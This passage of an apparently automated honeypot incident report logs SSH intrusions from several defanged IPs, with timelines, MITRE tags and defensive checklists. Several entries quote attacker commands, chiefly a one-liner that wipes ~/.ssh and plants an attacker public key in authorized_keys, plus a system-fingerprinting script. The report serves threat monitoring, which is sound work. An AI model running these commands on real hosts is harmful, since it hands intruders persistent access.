- [ ] Submit `49.43.241[.]11` to AbuseIPDB if not already reported
- [ ] Block `49.43.241[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-572434df3657

| Field | Detail |
|---|---|
| **Source IP** | `49.43.241[.]11` |
| **First Seen** | 2026-07-01 17:14 |
| **Last Seen** | 2026-07-01 17:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:14:27` | `cowrie.session.connect` |
| `2026-07-01 17:14:27` | `cowrie.client.version` |
| `2026-07-01 17:14:27` | `cowrie.client.kex` |
| `2026-07-01 17:14:28` | `cowrie.login.success` |
| `2026-07-01 17:14:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.43.241[.]11` to AbuseIPDB if not already reported
- [ ] Block `49.43.241[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cbacf96ba26

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-01 17:16 |
| **Last Seen** | 2026-07-01 17:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:16:53` | `cowrie.session.connect` |
| `2026-07-01 17:16:53` | `cowrie.client.version` |
| `2026-07-01 17:16:53` | `cowrie.client.kex` |
| `2026-07-01 17:16:54` | `cowrie.login.success` |
| `2026-07-01 17:16:54` | `cowrie.session.params` |
| `2026-07-01 17:16:54` | `cowrie.command.input` |
| `2026-07-01 17:16:54` | `cowrie.command.input` |
| `2026-07-01 17:16:54` | `cowrie.command.input` |
| `2026-07-01 17:16:54` | `cowrie.command.input` |
| `2026-07-01 17:16:54` | `cowrie.command.input` |
| `2026-07-01 17:16:54` | `cowrie.command.success` |
| `2026-07-01 17:16:54` | `cowrie.command.input` |
| `2026-07-01 17:16:54` | `cowrie.command.input` |
| `2026-07-01 17:16:54` | `cowrie.command.input` |
| `2026-07-01 17:16:54` | `cowrie.command.input` |
| `2026-07-01 17:16:55` | `cowrie.log.closed` |
| `2026-07-01 17:16:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d48e7bb11c5a

| Field | Detail |
|---|---|
| **Source IP** | `103.59.161[.]120` |
| **First Seen** | 2026-07-01 17:17 |
| **Last Seen** | 2026-07-01 17:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:17:01` | `cowrie.session.connect` |
| `2026-07-01 17:17:01` | `cowrie.client.version` |
| `2026-07-01 17:17:01` | `cowrie.client.kex` |
| `2026-07-01 17:17:02` | `cowrie.login.success` |
| `2026-07-01 17:17:03` | `cowrie.session.params` |
| `2026-07-01 17:17:03` | `cowrie.command.input` |
| `2026-07-01 17:17:03` | `cowrie.command.failed` |
| `2026-07-01 17:17:04` | `cowrie.log.closed` |
| `2026-07-01 17:17:05` | `cowrie.session.params` |
| `2026-07-01 17:17:05` | `cowrie.command.input` |
| `2026-07-01 17:17:05` | `cowrie.session.file_download` |
| `2026-07-01 17:17:05` | `cowrie.log.closed` |
| `2026-07-01 17:17:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.161[.]120` to AbuseIPDB if not already reported
- [ ] Block `103.59.161[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d04be882e65d

| Field | Detail |
|---|---|
| **Source IP** | `103.59.161[.]120` |
| **First Seen** | 2026-07-01 17:17 |
| **Last Seen** | 2026-07-01 17:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:17:05` | `cowrie.session.connect` |
| `2026-07-01 17:17:05` | `cowrie.client.version` |
| `2026-07-01 17:17:06` | `cowrie.client.kex` |
| `2026-07-01 17:17:07` | `cowrie.login.success` |
| `2026-07-01 17:17:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.161[.]120` to AbuseIPDB if not already reported
- [ ] Block `103.59.161[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5a60f0cf402

| Field | Detail |
|---|---|
| **Source IP** | `103.59.161[.]120` |
| **First Seen** | 2026-07-01 17:17 |
| **Last Seen** | 2026-07-01 17:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:17:07` | `cowrie.session.connect` |
| `2026-07-01 17:17:07` | `cowrie.client.version` |
| `2026-07-01 17:17:07` | `cowrie.client.kex` |
| `2026-07-01 17:17:08` | `cowrie.login.success` |
| `2026-07-01 17:17:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.161[.]120` to AbuseIPDB if not already reported
- [ ] Block `103.59.161[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd9d0a8ec7b1

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]103` |
| **First Seen** | 2026-07-01 17:17 |
| **Last Seen** | 2026-07-01 17:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:17:52` | `cowrie.session.connect` |
| `2026-07-01 17:17:52` | `cowrie.client.version` |
| `2026-07-01 17:17:52` | `cowrie.client.kex` |
| `2026-07-01 17:17:53` | `cowrie.login.success` |
| `2026-07-01 17:17:55` | `cowrie.session.params` |
| `2026-07-01 17:17:55` | `cowrie.command.input` |
| `2026-07-01 17:17:55` | `cowrie.command.failed` |
| `2026-07-01 17:17:55` | `cowrie.log.closed` |
| `2026-07-01 17:17:56` | `cowrie.session.params` |
| `2026-07-01 17:17:56` | `cowrie.command.input` |
| `2026-07-01 17:17:56` | `cowrie.session.file_download` |
| `2026-07-01 17:17:56` | `cowrie.log.closed` |
| `2026-07-01 17:17:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]103` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3af8b1c4b83

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]103` |
| **First Seen** | 2026-07-01 17:17 |
| **Last Seen** | 2026-07-01 17:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:17:56` | `cowrie.session.connect` |
| `2026-07-01 17:17:56` | `cowrie.client.version` |
| `2026-07-01 17:17:56` | `cowrie.client.kex` |
| `2026-07-01 17:17:57` | `cowrie.login.success` |
| `2026-07-01 17:17:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]103` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f26d9ca3de38

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]103` |
| **First Seen** | 2026-07-01 17:17 |
| **Last Seen** | 2026-07-01 17:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:17:58` | `cowrie.session.connect` |
| `2026-07-01 17:17:58` | `cowrie.client.version` |
| `2026-07-01 17:17:58` | `cowrie.client.kex` |
| `2026-07-01 17:17:59` | `cowrie.login.success` |
| `2026-07-01 17:17:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]103` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81e7b40407df

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 17:18 |
| **Last Seen** | 2026-07-01 17:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:18:12` | `cowrie.session.connect` |
| `2026-07-01 17:18:12` | `cowrie.client.version` |
| `2026-07-01 17:18:12` | `cowrie.client.kex` |
| `2026-07-01 17:18:12` | `cowrie.login.success` |
| `2026-07-01 17:18:13` | `cowrie.session.params` |
| `2026-07-01 17:18:13` | `cowrie.command.input` |
| `2026-07-01 17:18:13` | `cowrie.command.input` |
| `2026-07-01 17:18:13` | `cowrie.command.input` |
| `2026-07-01 17:18:13` | `cowrie.command.input` |
| `2026-07-01 17:18:13` | `cowrie.command.input` |
| `2026-07-01 17:18:13` | `cowrie.command.success` |
| `2026-07-01 17:18:13` | `cowrie.command.input` |
| `2026-07-01 17:18:13` | `cowrie.command.input` |
| `2026-07-01 17:18:13` | `cowrie.command.input` |
| `2026-07-01 17:18:13` | `cowrie.command.input` |
| `2026-07-01 17:18:13` | `cowrie.log.closed` |
| `2026-07-01 17:18:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-781d1e9002c2

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-01 17:18 |
| **Last Seen** | 2026-07-01 17:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:18:26` | `cowrie.session.connect` |
| `2026-07-01 17:18:27` | `cowrie.client.version` |
| `2026-07-01 17:18:27` | `cowrie.client.kex` |
| `2026-07-01 17:18:29` | `cowrie.login.success` |
| `2026-07-01 17:18:31` | `cowrie.session.params` |
| `2026-07-01 17:18:31` | `cowrie.command.input` |
| `2026-07-01 17:18:31` | `cowrie.log.closed` |
| `2026-07-01 17:18:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afe1c80ea793

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 17:19 |
| **Last Seen** | 2026-07-01 17:19 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:19:22` | `cowrie.session.connect` |
| `2026-07-01 17:19:23` | `cowrie.client.version` |
| `2026-07-01 17:19:23` | `cowrie.client.kex` |
| `2026-07-01 17:19:29` | `cowrie.login.success` |
| `2026-07-01 17:19:33` | `cowrie.session.params` |
| `2026-07-01 17:19:33` | `cowrie.command.input` |
| `2026-07-01 17:19:34` | `cowrie.log.closed` |
| `2026-07-01 17:19:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0beaead8114b

| Field | Detail |
|---|---|
| **Source IP** | `150.241.77[.]28` |
| **First Seen** | 2026-07-01 17:20 |
| **Last Seen** | 2026-07-01 17:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:20:32` | `cowrie.session.connect` |
| `2026-07-01 17:20:32` | `cowrie.client.version` |
| `2026-07-01 17:20:32` | `cowrie.client.kex` |
| `2026-07-01 17:20:32` | `cowrie.login.success` |
| `2026-07-01 17:20:33` | `cowrie.session.params` |
| `2026-07-01 17:20:33` | `cowrie.command.input` |
| `2026-07-01 17:20:33` | `cowrie.command.failed` |
| `2026-07-01 17:20:33` | `cowrie.log.closed` |
| `2026-07-01 17:20:34` | `cowrie.session.params` |
| `2026-07-01 17:20:34` | `cowrie.command.input` |
| `2026-07-01 17:20:34` | `cowrie.session.file_download` |
| `2026-07-01 17:20:34` | `cowrie.log.closed` |
| `2026-07-01 17:20:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.241.77[.]28` to AbuseIPDB if not already reported
- [ ] Block `150.241.77[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7c917377c14

| Field | Detail |
|---|---|
| **Source IP** | `150.241.77[.]28` |
| **First Seen** | 2026-07-01 17:20 |
| **Last Seen** | 2026-07-01 17:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:20:34` | `cowrie.session.connect` |
| `2026-07-01 17:20:34` | `cowrie.client.version` |
| `2026-07-01 17:20:34` | `cowrie.client.kex` |
| `2026-07-01 17:20:35` | `cowrie.login.success` |
| `2026-07-01 17:20:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.241.77[.]28` to AbuseIPDB if not already reported
- [ ] Block `150.241.77[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f914b1ee5e9e

| Field | Detail |
|---|---|
| **Source IP** | `150.241.77[.]28` |
| **First Seen** | 2026-07-01 17:20 |
| **Last Seen** | 2026-07-01 17:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:20:35` | `cowrie.session.connect` |
| `2026-07-01 17:20:35` | `cowrie.client.version` |
| `2026-07-01 17:20:35` | `cowrie.client.kex` |
| `2026-07-01 17:20:35` | `cowrie.login.success` |
| `2026-07-01 17:20:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.241.77[.]28` to AbuseIPDB if not already reported
- [ ] Block `150.241.77[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c39f2320852

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-01 17:20 |
| **Last Seen** | 2026-07-01 17:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:20:47` | `cowrie.session.connect` |
| `2026-07-01 17:20:47` | `cowrie.client.version` |
| `2026-07-01 17:20:47` | `cowrie.client.kex` |
| `2026-07-01 17:20:47` | `cowrie.login.success` |
| `2026-07-01 17:20:48` | `cowrie.session.params` |
| `2026-07-01 17:20:48` | `cowrie.command.input` |
| `2026-07-01 17:20:48` | `cowrie.command.input` |
| `2026-07-01 17:20:48` | `cowrie.command.input` |
| `2026-07-01 17:20:48` | `cowrie.command.input` |
| `2026-07-01 17:20:48` | `cowrie.command.input` |
| `2026-07-01 17:20:48` | `cowrie.command.success` |
| `2026-07-01 17:20:48` | `cowrie.command.input` |
| `2026-07-01 17:20:48` | `cowrie.command.input` |
| `2026-07-01 17:20:48` | `cowrie.command.input` |
| `2026-07-01 17:20:48` | `cowrie.command.input` |
| `2026-07-01 17:20:48` | `cowrie.log.closed` |
| `2026-07-01 17:20:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-978ebcd79ba9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 17:24 |
| **Last Seen** | 2026-07-01 17:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:24:05` | `cowrie.session.connect` |
| `2026-07-01 17:24:05` | `cowrie.client.version` |
| `2026-07-01 17:24:06` | `cowrie.client.kex` |
| `2026-07-01 17:24:06` | `cowrie.login.success` |
| `2026-07-01 17:24:07` | `cowrie.session.params` |
| `2026-07-01 17:24:07` | `cowrie.command.input` |
| `2026-07-01 17:24:07` | `cowrie.command.input` |
| `2026-07-01 17:24:07` | `cowrie.command.input` |
| `2026-07-01 17:24:07` | `cowrie.command.input` |
| `2026-07-01 17:24:07` | `cowrie.command.input` |
| `2026-07-01 17:24:07` | `cowrie.command.success` |
| `2026-07-01 17:24:07` | `cowrie.command.input` |
| `2026-07-01 17:24:07` | `cowrie.command.input` |
| `2026-07-01 17:24:07` | `cowrie.command.input` |
| `2026-07-01 17:24:07` | `cowrie.command.input` |
| `2026-07-01 17:24:07` | `cowrie.log.closed` |
| `2026-07-01 17:24:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a71eca147cf

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-01 17:25 |
| **Last Seen** | 2026-07-01 17:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:25:06` | `cowrie.session.connect` |
| `2026-07-01 17:25:06` | `cowrie.client.version` |
| `2026-07-01 17:25:06` | `cowrie.client.kex` |
| `2026-07-01 17:25:07` | `cowrie.login.success` |
| `2026-07-01 17:25:07` | `cowrie.session.params` |
| `2026-07-01 17:25:07` | `cowrie.command.input` |
| `2026-07-01 17:25:07` | `cowrie.command.input` |
| `2026-07-01 17:25:07` | `cowrie.command.input` |
| `2026-07-01 17:25:07` | `cowrie.command.input` |
| `2026-07-01 17:25:07` | `cowrie.command.input` |
| `2026-07-01 17:25:07` | `cowrie.command.success` |
| `2026-07-01 17:25:07` | `cowrie.command.input` |
| `2026-07-01 17:25:07` | `cowrie.command.input` |
| `2026-07-01 17:25:07` | `cowrie.command.input` |
| `2026-07-01 17:25:07` | `cowrie.command.input` |
| `2026-07-01 17:25:08` | `cowrie.log.closed` |
| `2026-07-01 17:25:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3960d4019aff

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-01 17:30 |
| **Last Seen** | 2026-07-01 17:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
